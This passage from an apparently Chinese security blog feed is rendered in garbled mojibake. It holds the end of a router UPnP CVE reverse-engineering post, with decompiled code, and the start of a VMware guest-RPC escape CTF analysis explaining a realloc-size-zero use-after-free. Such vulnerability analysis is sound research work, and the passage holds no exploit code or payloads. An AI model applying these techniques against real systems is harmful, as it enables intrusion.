‡è®°ï¼Œæ¥æœ‰åºçš„ï¼Œå¹¶ä¸”ä¿è¯æ­£ç¡®ç±»å‹å‘è°ƒç”¨è€…æä¾›æ¥å£ã€‚</p><p>ç„¶åå›è¿‡å¤´æ¥ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ä¸Šä¸€é¡µçš„è°ƒç”¨ã€‚è¯¥æœåŠ¡çš„å‚æ•°å¯¹åº”çš„æ˜¯åç§»ä¸º0å’Œ1çš„ä½ç½®ï¼Œå…³è”åˆ°æœ¬å‡½æ•°ï¼Œå–å‡ºçš„æ˜¯74åç§»çš„å­—ç¬¦ä¸²ã€‚</p><p>æ­¤æ—¶å‘ç°ç¬¬ä¸€ä¸ªå‡½æ•°æœ‰ç‚¹çœ¼ç†Ÿï¼Œè¿›å»ä¸€çœ‹</p><p><img src="https://i.bmp.ovh/imgs/2022/01/85901983c9b7f862.png" alt=""></p><p>å‘ç°å°±æ˜¯æ¼æ´å‡½æ•°ã€‚äºæ˜¯ç¡®å®šäº†è¯¥æ¼æ´å‡½æ•°çš„è§¦å‘æ—¶åˆ©ç”¨é—´æ¥çš„è™šè¡¨è°ƒç”¨ã€‚æ£€æŸ¥è¯¥è™šè¡¨çš„äº¤å‰å¼•ç”¨ã€‚</p><p><img src="https://i.bmp.ovh/imgs/2022/01/6beab2d510dcaca8.png" alt=""></p><p>è°ƒç”¨å‡ºäº†æœ¬å‡½æ•°å…¨éƒ½æ˜¯<code>UPnPGetActionByName</code>å‡½æ•°ã€‚</p><p>ç„¶åä¸€ç›´å‘ä¸Šæ£€æŸ¥äº¤å‰å¼•ç”¨ï¼Œæ£€æŸ¥åˆ°äº†<code>ATP_UPNP_Init</code>å‡½æ•°ã€‚è¯¥å‡½æ•°æ—¶åˆå§‹åŒ–upnpæœåŠ¡æ—¶å€™æ‰€è°ƒç”¨çš„å‡½æ•°ï¼Œ</p><p>é‚£ä¹ˆè‡³æ­¤è¯¥æ¼æ´çš„å‡ºå‘é“¾ä¹Ÿå·²ç»å®Œå…¨å‘ç°äº†ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">main -<span class="token operator">></span> ATP+UPNP_init -<span class="token operator">></span> sub_40B5B4 -<span class="token operator">></span> sub_40A9C8 -<span class="token operator">></span> UPnPGetActionByName<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h3 id="æ¼æ´è§¦å‘ä½ç½®"><a class="header-anchor" href="#æ¼æ´è§¦å‘ä½ç½®">Â¶</a>æ¼æ´è§¦å‘ä½ç½®</h3><p>çœ‹ä¸€ä¸‹æœ€ç»ˆè§¦å‘æ¼æ´çš„å‡½æ•°ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">undefined4 <span class="token function">UPnPGetActionByName</span><span class="token punctuation">(</span><span class="token keyword">int</span> param_1<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>param_2<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>param_3<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>param_4<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar2<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>ppcVar3<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>pcVar4<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>param_1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>param_2 <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>param_4 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token operator">*</span>param_4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>ppcVar3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ppcVar3 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">;</span>        ppcVar3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>ppcVar3<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      pcVar4 <span class="token operator">=</span> ppcVar3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint<span class="token punctuation">)</span>pcVar4 <span class="token operator">&amp;</span> <span class="token number">0x40000000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        pcVar4 <span class="token operator">=</span> <span class="token operator">*</span>ppcVar3<span class="token punctuation">;</span>        iVar1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>pcVar4 <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">;</span>        iVar2 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> iVar1<span class="token punctuation">)</span><span class="token punctuation">,</span>param_2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>iVar2 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>           <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> iVar1 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span> <span class="token operator">||</span>            <span class="token punctuation">(</span>iVar1 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> iVar1 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>param_3<span class="token punctuation">)</span><span class="token punctuation">,</span> iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>param_4 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token operator">*</span>param_4 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>pcVar4 <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>ppcVar3 <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        iVar1 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">*</span>ppcVar3<span class="token punctuation">,</span>param_2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>param_4 <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token operator">*</span>param_4 <span class="token operator">=</span> pcVar4<span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œreturnè¿”å›çš„æ˜¯ï¼Œ<code>return *(undefined4 *)(g_astActionArray + (int)*ppcVar3 * 0x10 + 8);</code>è€Œ<code>(ppcVar3 = *(char ***)(param_1 + 0x24)</code><br>è¿”å›ä¸Šçº§è°ƒç”¨æŸ¥çœ‹ç¬¬ä¸€ä¸ªå‚æ•°ã€‚</p><p><img src="https://i.bmp.ovh/imgs/2022/01/737c1bd8ec3d0bde.png" alt=""></p><p>ç»§ç»­æŸ¥çœ‹<code>UpnpGetServiceByUrl</code>å‡½æ•°ã€‚</p><p><img src="https://i.bmp.ovh/imgs/2022/01/1256eca8a4f1d763.png" alt=""></p><p>ç»è¿‡äº†é¢„å¤„ç†ä¹‹åï¼Œå¦‚æœè¿˜æ²¡æœ‰è¿”å›ï¼Œé‚£ä¹ˆå°±ä¼šç»§ç»­æ¥ä¸‹æ¥çš„åˆ¤æ–­ã€‚</p><p><img src="https://i.bmp.ovh/imgs/2022/01/f12f04bdca370358.png" alt=""></p><p>è¿™æ ·çš„åˆ¤æ–­å’Œè™šè¡¨æœ‰äº›ç±»ä¼¼ï¼Œä½†æ˜¯æš‚æ—¶å’Œæˆ‘ä»¬æ‰€éœ€è¦çš„åˆ†æå‡½æ•°ä¸­çš„<code>g_pstUpnpGvarHead</code>å˜é‡æ²¡æœ‰å…³ç³»ï¼Œè¿™ä¸ªå˜é‡åœ¨åæ±‡ç¼–å™¨ä¸­ä¹Ÿçœ‹ä¸åˆ°ã€‚</p><p>ç»§ç»­çœ‹è¿™ä¸ªå‡½æ•°ï¼Œå†<code>if</code>åˆ¤æ–­ä¹‹åï¼Œè¿˜æœ‰ä¸€ä¸ª<code>strcmp</code>å‡½æ•°ï¼Œå¯ä»¥å‘ç°è¿™ä¸ªæ¯”è¾ƒå‡½æ•°çš„å‚æ•°1ï¼Œå·²ç»åˆsnprintfæ”¹ç¼–ä¸ºäº†ç›®å‰åç§»ä½ç½®çš„å‡½æ•°ã€‚è¿›è¡Œäº†ç¬¬äºŒæ¬¡å‡½æ•°åˆ¤åˆ«ï¼Œåˆ¤æ–­è¯¥æœåŠ¡æ˜¯å¦æ˜¯è°ƒç”¨è€…è¦è°ƒç”¨çš„ç›®æ ‡æœåŠ¡ã€‚</p><p>æ‰€ä»¥èƒ½å¤Ÿç¡®å®šè¯¥å‡½æ•°æ˜¯ä¸€ä¸ªï¼Œç¡®å®šè°ƒç”¨è€…è°ƒç”¨æœåŠ¡çš„å‡½æ•°ï¼Œå°±æ˜¯è¯´åªè¦è®¿é—®<code>url</code><br><code>/ctrlt/å‡½æ•°æœåŠ¡</code>å°±å¯ä»¥è®¿é—®å¯¹åº”çš„æœåŠ¡ï¼Œä½†æ˜¯ä»”ç»†çœ‹å°±ä¼šå‘ç°<code>snprintf</code>å‡½æ•°ç»™å‡½æ•°æœåŠ¡è§„å®šäº†ä¸€å®šçš„æ ¼å¼ã€‚</p><p><img src="https://i.bmp.ovh/imgs/2022/01/d89af09884dad711.png" alt=""></p><p>åªæœ‰æ»¡è¶³<code>Name_num</code>çš„æ ¼å¼æ‰æ˜¯ä¸€ä¸ªåˆæ³•çš„æœåŠ¡ã€‚å…³äºè¿™ä¸ªå…³é”®çš„å…¨å±€å˜é‡<code>g_pstUpnpGvarHead</code>è¯¥å˜é‡åªæœ‰åœ¨<code>UPNP_Init</code>å‡½æ•°æ‰è¢«è°ƒç”¨ï¼Œäºæ˜¯ç»§ç»­å¾€ä¸Šè¿½è¸ªè¯¥å˜é‡ã€‚</p><p>åœ¨åˆå§‹åŒ–å‡½æ•°ä¸­å‘ç°ï¼Œåœ¨è¿™ä¸€å¥ä¸­åˆå§‹åŒ–äº†ï¼š<code>g_pstUpnpGvarHead = (int *)ATP_UTIL_GVarGetValue(0x20001,0);</code></p><p>å¹¶ä¸”è¯¥å‡½æ•°æ˜¯ä¸ªé“¾æ¥å‡½æ•°ï¼Œæ‰€ä»¥æ— æ³•å¾—çŸ¥å…¶å†…å®¹ï¼Œé‚£ä¹ˆè¯¥å˜é‡çš„åˆ†æå…ˆå‘Šä¸€æ®µè½ï¼ŒåæœŸä¼šåŠ¨æ€è°ƒè¯•è·å¾—è¯¥å†…å­˜çš„å†…å®¹ã€‚</p><p>å›åˆ°<code>sub_40A9C8</code>å‡½æ•°è°ƒç”¨<code>UpnpGetServiceByUr</code>çš„ä½ç½®ã€‚å‘ç°è°ƒç”¨è¯¥å‡½æ•°ä¹‹å‰ä¹Ÿæ˜¯ä¸€äº›urlçš„åˆ†æï¼Œè°ƒç”¨è¯¥å‡½æ•°ä¹‹åï¼Œ</p><p><img src="https://i.bmp.ovh/imgs/2022/01/f65dfda3721d709d.png" alt=""></p><p>æ˜¯åœ¨è§£æxmlæ ¼å¼çš„æ–‡ä»¶ã€‚è§£æå®Œäº†æ ¼å¼å°±ä¼šè°ƒç”¨æ¼æ´å‡½æ•°ï¼Œæ‰€ä»¥æ–­å®šï¼Œæƒ³è¦è§¦å‘å‡½æ•°ï¼Œä¸€å®šè¦è·å¾—ç›®æ ‡å…¨å±€å˜é‡çš„å€¼ï¼Œä½¿ç”¨qemu-mips-staticå¼€å¯è°ƒè¯•æ¨¡å¼å‘ç°ï¼Œä¸ä¼šè¿›å…¥åˆ°upnpåˆå§‹åŒ–é‡Œé¢å»ï¼Œå¯èƒ½æ˜¯è¯¥æœåŠ¡çš„åŸå› ã€‚</p><h2 id="æ€»ç»“"><a class="header-anchor" href="#æ€»ç»“">Â¶</a>æ€»ç»“</h2><ul><li>é€†å‘æœåŠ¡çš„æ—¶å€™ï¼Œè¦ç»†è‡´ï¼Œèƒ½åŠ¨è°ƒå°±è°ƒè¯•ï¼Œä½†æ˜¯ä¸èƒ½ä¸€ä¸Šæ¥å°±è°ƒè¯•ï¼Œä¸­é—´æœ‰è®¸å¤šçš„ç»†èŠ‚è¿˜æ˜¯ä¸è¦ä¸¢å¤±</li><li>è·¯ç”±å™¨æ¼æ´å…¥é—¨ï¼Œå­¦åˆ°äº†è®¸å¤šæ–°çš„çŸ¥è¯†ï¼Œä¹Ÿæ˜¯åˆ†æçš„ç¬¬ä¸€ä¸ªCVEï¼Œè€—æ—¶1å¤©åŠ</li><li>å‘½ä»¤æ³¨å…¥ï¼Œå¤šå¯»æ‰¾systemå‡½æ•°ï¼Œè¿™ç±»å‡½æ•°åœ¨å¤§å‹çš„é¡¹ç›®ä¸­åŸºæœ¬éƒ½ä½¿ç”¨</li></ul>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IOT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è™šæ‹Ÿæœºé€ƒé€¸ï¼ˆäºŒï¼‰</title>
    <link href="/2022/06/22/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2022/06/22/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<blockquote><p>æœ¬æ–‡é¦–å‘äºå¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº:<a href="https://forum.butian.net/share/1678">https://forum.butian.net/share/1678</a></p></blockquote><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>åˆæ¬¡åˆ†æè™šæ‹Ÿæœºé€ƒé€¸ï¼Œä¹‹å‰åˆ†æäº†ä¸€ç¯‡rwctf2018ï¼Œè¿™æ¬¡è§†çº¿è½¬åˆ°å¼ºç½‘æ¯çš„ä¸€ä¸ªè™šæ‹Ÿæœºé€ƒé€¸åˆ†æã€‚éš¾åº¦æ¯”rwå¤§ä¸€ç‚¹ç‚¹ï¼Œä½†æ˜¯é€†å‘åˆ†æè¿˜æ˜¯é‡ç‚¹ï¼Œæ‰€ä»¥ä¹Ÿä¸ä¼šå·®åˆ°å“ªé‡Œå»ã€‚</p><p>ä¸€äº›æœ‰å…³åŸºç¡€çš„é“¾æ¥æ”¾åœ¨è¿™é‡Œï¼Œä¸åšèµ˜è¿°ã€‚</p><p><a href="https://nafod.net/blog/2019/12/21/station-escape-vmware-pwn.html">é¢˜è§£</a></p><p><a href="http://sysprogs.com/legacy/articles/kdvmware/guestrpc.shtml">RPC&#x2F;backdooræœºåˆ¶</a></p><h2 id="0x01-åˆ†æ"><a href="#0x01-åˆ†æ" class="headerlink" title="0x01 åˆ†æ"></a>0x01 åˆ†æ</h2><h3 id="bindiff"><a href="#bindiff" class="headerlink" title="bindiff"></a>bindiff</h3><p>è¿™ç±»é¢˜ç›®éƒ½ä¼šç»™ä¸€ä¸ªpatchedçš„vmxæ–‡ä»¶ï¼Œå®‰è£…vmwareåï¼Œåœ¨<code>/usr/lib/vmware/bin</code>ç›®å½•ä¸‹å¯ä»¥æ‰¾åˆ°ç›®æ ‡vmxã€‚ä½¿ç”¨bindiffæ¯”è¾ƒpatchedå’Œpatchä¹‹å‰çš„åŒºåˆ«å¯ä»¥è¿…é€Ÿå®šä½æ¼æ´çš„ä½ç½®ã€‚</p><p>ï¼ˆbindiffåˆ†æå¤ªæ…¢äº†ï¼Œè¿™æ¬¡é€‰æ‹©äº†010ï¼‰</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-89eec2810b186d524efda555894cca9031ad35e7.png" alt="å›¾ç‰‡.png"></p><p>æœ‰ä¸‰å¤„ä¸åŒï¼Œidaå®šä½åˆ°å…³é”®ä½ç½®ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-18b396ee70885b34dc4b57846efde51baa0d1a1f.png" alt="å›¾ç‰‡.png"></p><p>ä¸€å¤„æŠŠr12dæ”¹æˆäº†r12wï¼Œç›¸å½“äºçœç•¥äº†r12çš„é«˜ä½ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b9b1beba56c3803f31e032d2c8476ce9c7d9fda8.png" alt="å›¾ç‰‡.png"></p><p>æŠŠè·³è½¬çš„æ¡ä»¶æ”¹ä¸ºäº†å¤§äºç­‰äºã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a25862dfd05d6be26c03539e4ccba81caefc64ab.png" alt="å›¾ç‰‡.png"></p><p>è·³è½¬æ”¹ä¸ºäº†æ— æ¡ä»¶ã€‚</p><p>æœ€åä¸€ä¸ªæ”¹å˜ï¼Œå–æ¶ˆäº†æ¡ä»¶æ£€æŸ¥ï¼Œå‰ä¸¤å¤„patchæ”¹å˜å¦‚ä¸‹ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-2c772477f3bc5dde104c35b1d042d567f8c8da28.png" alt="å›¾ç‰‡.png"></p><p>æœ¬èƒ½çš„ååº”å°±æ˜¯reallocå‡½æ•°çš„æ¼æ´ï¼Œè¿™ç±»é¢˜åœ¨å¸¸è§„pwnä¸­å¾ˆå¸¸è§ï¼Œreallocå‡½æ•°ç¬¬äºŒä¸ªsizeå‚æ•°å¦‚æœä¸º0ï¼Œåˆ™å’Œfreeæ•ˆæœä¸€æ ·ï¼Œå¸¸å¸¸ä¼šå¯¼è‡´DFã€UAF.æ¥ä¸‹æ¥ç»†çœ‹ä¸€ä¸‹ä¼ªä»£ç ã€‚</p><h3 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p>Vmxæ¼æ´ä¾ç„¶ä½äºguestRPCçš„å¤„ç†å‡½æ•°ä¸­ï¼Œè¯¥å‡½æ•°ä¸­ä½¿ç”¨äº†ä¸€ä¸ªå¤§çš„switchå¤„ç†ä¸åŒçš„ä¿¡æ¯ã€‚æ¥ä¸‹æ¥è¯¦ç»†åˆ†æã€‚ï¼ˆè™šæ‹Ÿæœºé€ƒé€¸ï¼ˆä¸€ï¼‰ä¸­åªç»™äº†åˆ†æçš„ç»“æ„ä½“ï¼‰</p><p>å…³äºä¸€äº›åŸºç¡€çŸ¥è¯†å¯ä»¥çœ‹<a href="">è™šæ‹Ÿæœºé€ƒé€¸ï¼ˆä¸€ï¼‰</a></p><h4 id="Open-RPC-channel"><a href="#Open-RPC-channel" class="headerlink" title="Open_RPC_channel"></a>Open_RPC_channel</h4><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-1f4c153972dee2b077f41122e57c31023c87979c.png" alt="å›¾ç‰‡.png"></p><p>è¿™æ˜¯switchä¸‹æœ€ç®€å•çš„ä¸€ä¸ªåˆ†æ”¯äº†ï¼Œæ‰“å¼€ä¿¡é“ï¼Œå†…å®¹å°±æ˜¯ç®€å•çš„æ¥å—æ•°æ®åŒ…ï¼Œç„¶åè·å¾—magicnumï¼ˆè¿™éƒ¨åˆ†æ˜¯è°ƒè¯•å¾—åˆ°çš„ï¼‰</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-4ac942da8b78bba6ed812cf7878a8b0b70561da5.png" alt="å›¾ç‰‡.png"></p><p>magicnumä¼šè¿›è¡Œä¸€ä¸ªæ¯”è¾ƒå¦‚æœå¤±è´¥å°±ç›´æ¥é€€å‡ºã€‚</p><h4 id="Send-RPC-command-length"><a href="#Send-RPC-command-length" class="headerlink" title="Send_RPC_command_length"></a>Send_RPC_command_length</h4><p>é¦–å…ˆåˆ¤æ–­<code>byte_FE9584</code>ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªé­”æ•°ï¼Œæ¥ç€å°±åˆ¤æ–­é•¿åº¦ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-3612cc7def195cc1c26ad8199975b01b1c452eb0.png" alt="å›¾ç‰‡.png"></p><p>é•¿åº¦ä¸º-1æˆ–è€…å¤§äº0x10000å°±ä¼šæŠ¥é”™ã€‚å¦‚æœRPCIçš„é•¿åº¦ç¬¦åˆå°±ä¼šç»§ç»­å¾€ä¸‹èµ°ã€‚!</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-38b67aa4103d4bfdb748b0cab800ba051690af6b.png" alt="å›¾ç‰‡.png"><br> åœ¨è¿™ä¸ªåˆ¤æ–­ä¸­ï¼Œæ¯”è¾ƒ56å’Œ21åç§»å¤„çš„å€¼ï¼Œv56ä¸ºæ¥æ”¶åˆ°çš„æ•°æ®åŒ…ï¼Œv21ä¸ºç°æœ‰é•¿åº¦ï¼Œå¦‚æœæ•°æ®é•¿åº¦å¤§äºç°æœ‰é•¿åº¦åˆ™reallocé‡æ–°åˆ†é…ï¼Œè®¾ç½®ç©ºé—´å¤§å°ä¸ºæ–°çš„å¤§å°ï¼Œä¸”ä¿®æ”¹msg_structã€‚</p><p>æ¼æ´å°±å‡ºåœ¨è¿™ä¸ªéƒ¨åˆ†ã€‚æ¼æ´å­˜åœ¨çš„æ¯”è¾ƒéšç§˜ï¼Œå¤§ä½“å±äºæ•´å½¢æº¢å‡ºã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-ac0faf0ad5f12e77c733f85edc1914098b407865.png" alt="å›¾ç‰‡.png"></p><p>æ­¤å¤„ï¼Œå¤„ç†sizeçš„æ—¶å€™åŠ å…¥äº†LOWORDä¿®é¥°ï¼Œå¯¼è‡´dword-&gt;wordé«˜ä½å¤±å»ï¼Œæ‰€ä»¥å¦‚æœè®¾ç½®v56&#x3D;0xffffåˆ™å¯ä»¥é€šè¿‡å¤§å°åˆ¤æ–­ï¼Œç„¶åLOWORD(0xffff+1)&#x3D;LOWORD(0x10000)&#x3D;0ï¼Œåˆ™æ­¤æ—¶çš„reallocç¬¬äºŒä¸ªå‚æ•°ä¸º0ï¼Œè¿è¡Œæ—¶é‡æ–°å›æ”¶ptrã€‚ä¹Ÿæ²¡æœ‰æ¸…0.å¯¼è‡´äº†ptrçš„UAFåˆ©ç”¨ã€‚</p><h4 id="Send-RPC-command-data"><a href="#Send-RPC-command-data" class="headerlink" title="Send_RPC_command_data"></a>Send_RPC_command_data</h4><p>é¦–å…ˆè¯»å…¥äº†éœ€è¦å‘é€çš„dataæŒ‡ä»¤ï¼Œç„¶åè¯»å–RPCIç»“æ„ä½“ï¼Œæ ¹æ®å‰é¢è®¾ç½®çš„é•¿åº¦ï¼Œä»¥ä¸åŒçš„æ–¹å¼å‘é€msgï¼Œä¸€æ¬¡æœ€å¤šå‘é€å››ä¸ªå­—èŠ‚ï¼Œå››ä¸ªå­—èŠ‚ä»¥å†…å‘é€çš„æ–¹å¼éƒ½æ˜¯ä¸€ä¸ªbyteä¸€ä¸ªbyteçš„å¤åˆ¶ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-36a2bba083009f75ce800f244312c2430730e108.png" alt="å›¾ç‰‡.png"></p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b5ba2447ff1d948dcf05d645861baddbc9ae0718.png" alt="å›¾ç‰‡.png"></p><p>å‘é€å®ŒæŒ‡ä»¤ä¹‹åï¼Œåˆ¤æ–­æ˜¯å¦å‘é€å®Œï¼Œå¦‚æœå‘é€å®Œäº†åˆ™è¿›å…¥æŒ‡ä»¤å¤„ç†ï¼Œæ ¹æ®ä¸€ä¸ªç±»ä¼¼è™šè¡¨çš„bssæ®µæŒ‡é’ˆï¼Œæ‰§è¡ŒæŸä¸ªå‡½æ•°rw2018ä¸­ï¼Œæœ€åå°±æ˜¯åŠ«æŒäº†è¿™æ ·ä¸€ä¸ªå‡½æ•°ï¼Œè®©æˆ‘ä»¬æˆåŠŸé€ƒé€¸ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-163cb20a6e28b6d9bce90892deae335522c69b65.png" alt="å›¾ç‰‡.png"><br> å¤„ç†å®Œä¹‹åï¼Œflagæ ‡å¿—ä¸ºè®¾ç½®ä¸º1.å…·ä½“çš„æŒ‡ä»¤å¯ä»¥æœç´¢å­—ç¬¦ä¸²ï¼Œä¹‹å‰åˆ†æçš„rw2018ä¸­ä¹Ÿæœ‰ç›¸åº”çš„åˆ†æï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°ã€‚</p><h4 id="Recieve-RPC-reply-length"><a href="#Recieve-RPC-reply-length" class="headerlink" title="Recieve_RPC_reply_length"></a>Recieve_RPC_reply_length</h4><p><img 